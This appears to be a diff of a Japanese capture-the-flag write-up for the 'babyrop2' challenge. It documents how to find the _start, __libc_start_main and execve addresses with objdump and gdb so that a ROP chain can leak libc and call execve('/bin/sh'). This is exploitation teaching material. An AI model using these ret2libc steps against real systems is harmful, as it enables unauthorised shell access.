@@ -330,6 +330,35 @@ addr_printf_plt = 0x00000000004004f0
 ### addr_start
 
 1回目のオーバーフローで実行したROPが終わったらもう一度プログラムの最初に戻すために使う。
+これもobjdump -dで調べることができる。
+gdbで起動して`print _start`でも見つかる。
+
+```bash-statement
+$ objdump -d ./babyrop2
+Disassembly of section .text:
+
+0000000000400540 <_start>:
+  400540:       31 ed                   xor    %ebp,%ebp
+  400542:       49 89 d1                mov    %rdx,%r9
+  400545:       5e                      pop    %rsi
+  400546:       48 89 e2                mov    %rsp,%rdx
+  400549:       48 83 e4 f0             and    $0xfffffffffffffff0,%rsp
+  40054d:       50                      push   %rax
+  40054e:       54                      push   %rsp
+  40054f:       49 c7 c0 40 07 40 00    mov    $0x400740,%r8
+  400556:       48 c7 c1 d0 06 40 00    mov    $0x4006d0,%rcx
+  40055d:       48 c7 c7 36 06 40 00    mov    $0x400636,%rdi
+  400564:       e8 a7 ff ff ff          callq  400510 <__libc_start_main@plt>
+  400569:       f4                      hlt
+  40056a:       66 0f 1f 44 00 00       nopw   0x0(%rax,%rax,1)
+$
+```
+
+```bash-statement
+gdb-peda$ print _start
+$1 = {<text variable, no debug info>} 0x400540 <_start>
+gdb-peda$
+```
 
 ```python
 addr_start = 0x400540
@@ -337,7 +366,7 @@ addr_start = 0x400540
 
 ### addr_libc_start_main
 start_main関数のlibc上でのアドレス。
-start_main関数がロードされているアドレスからこのアドレスを引くことでlibcがロードされているアドレスを算出することができる。
+GOTアドレスからリークさせたstart_main関数がロードされているアドレスaddr_start_mainからこのアドレスを引くことでlibcがロードされているアドレスaddr_offsetを算出することができる。
 
 調べ方は`objdump -d libc.so.6`して出てきたコード上のアドレスを探すだけ。
 
@@ -350,21 +379,18 @@ $ objdump -d libc.so.6 | grep start_main
 addr_libc_start_main = 0x0000000000020740
 ```
 
-### addr_libc_execve、
+### addr_libc_execve
 execveのlibc上でのアドレス。
 このアドレスとlibcがロードされているアドレスを足せばexecveがロードされているアドレスaddr_execveが分かるのでexecve("/bin/sh")が実行できる。
 
 調べ方は`objdump -d libc.so.6`して出てきたコード上のアドレスを探すだけ。
 
 ```bash-statement
-$ objdump -d libc.so.6 | grep start_main
-0000000000020740 <__libc_start_main@@GLIBC_2.2.5>:
 $ objdump -d libc.so.6 | grep execve
 00000000000cc770 <execve@@GLIBC_2.2.5>:
 ```
 
 ```python
-addr_libc_start_main = 0x0000000000020740
 addr_libc_execve = 0x00000000000cc770
 ```
 
